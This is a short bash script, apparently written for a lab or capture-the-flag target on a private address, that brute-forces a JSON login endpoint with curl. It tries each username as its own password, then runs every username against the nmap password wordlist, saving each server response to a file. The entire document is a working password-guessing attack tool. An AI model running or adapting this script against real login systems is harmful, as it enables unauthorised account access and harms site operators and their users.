#!/bin/bash
#
# cURL Bruteforce Skript v0.1 by d1g
# 
# Note: use find . -type f -size xxxxc -exec rm {}\; to erase non-relevant output files
# 
# Use usernames and in this first loop also as passwords
for i in `cat users`
do 
curl -o ${i}.nfo -i -X POST http://192.168.56.203/login.php  -d "{\"user\":\"${i}\",\"password\":\"${i}\"}" -H "Content-type: application/json" 
# Use usernames and in this second loop a wordlist for passwords
for j in `cat /usr/share/wordlists/nmap.lst` 
do 
curl -o ${i}${j}.nfo -i -X POST http://192.168.56.203/login.php -d "{\"user\":\"${i}\",\"password\":\"${j}\"}" -H "Content-type: application/json" ; echo user: $i pass: $j 
done
done
exit 0
